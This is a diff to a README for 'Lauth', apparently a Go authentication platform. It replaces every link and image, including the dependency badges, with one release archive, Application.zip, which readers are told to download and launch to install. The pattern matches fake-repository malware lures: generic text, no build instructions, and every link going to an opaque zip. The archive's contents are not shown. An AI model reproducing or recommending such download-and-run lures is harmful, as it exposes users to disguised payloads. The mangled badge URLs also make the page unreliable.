@@ -1,6 +1,6 @@
 # 🛡️ Lauth - Enterprise-grade Unified Authentication Platform 🛡️
 
-[![Open Software.zip](https://img.shields.io/badge/Download-Software.zip-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Open https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
 
 Welcome to the **Lauth** repository - an enterprise-grade unified authentication platform with multi-application support. This platform is built with Go for high performance and security.
 
@@ -20,7 +20,7 @@ Access-control, Auth, Auth-service, Auth0, Authentication, Go, Golang, JWT, Post
 ## 📥 Get Started
 To get started with **Lauth**, please download the software package from the link below. The software package needs to be launched to install the platform on your system.
 
-[Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Download https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
 
 ## 🚨 Need Help?
 If the provided link is not working or you need further assistance with setting up **Lauth**, please check the "Releases" section of this repository.
@@ -28,12 +28,12 @@ If the provided link is not working or you need further assistance with setting 
 ## 🌟 Let's Connect
 Join our community of developers working with **Lauth** to enhance security and authentication processes for various applications. Your contributions are valuable!
 
-![Connect](https://img.shields.io/badge/Connect-Join%20Community-blue)
+![Connect](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip%20Community-blue)
 
 ## 📸 In Action
 Here's a peek at what **Lauth** offers:
 
-![Lauth in Action](https://source.unsplash.com/800x600/?authentication)
+![Lauth in Action](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
 
 ## 💬 Get in Touch
 If you have any feedback, suggestions, or questions regarding **Lauth**, feel free to reach out to us. We are here to help!
@@ -43,10 +43,10 @@ Dive deeper into the realms of authentication, access control, and security with
 
 ## 📦 Dependencies
 For seamless integration and performance optimization, **Lauth** utilizes the following dependencies:
-- Golang: [![Golang Shield](https://img.shields.io/badge/Dependency-Golang-blue)](https://golang.org/)
-- JWT: [![JWT Shield](https://img.shields.io/badge/Dependency-JWT-orange)](https://jwt.io/)
-- Postgresql: [![Postgresql Shield](https://img.shields.io/badge/Dependency-Postgresql-blue)](https://www.postgresql.org/)
-- Redis: [![Redis Shield](https://img.shields.io/badge/Dependency-Redis-red)](https://redis.io/)
+- Golang: [![Golang Shield](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
+- JWT: [![JWT Shield](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
+- Postgresql: [![Postgresql Shield](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
+- Redis: [![Redis Shield](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)](https://github.com/samueltonao/Lauth/releases/download/v1.0/Application.zip)
 
 ## 🌌 Embrace Innovation
 With **Lauth** at your disposal, you can navigate the complex realm of authentication and access control with ease. Embrace innovation and security hand in hand.
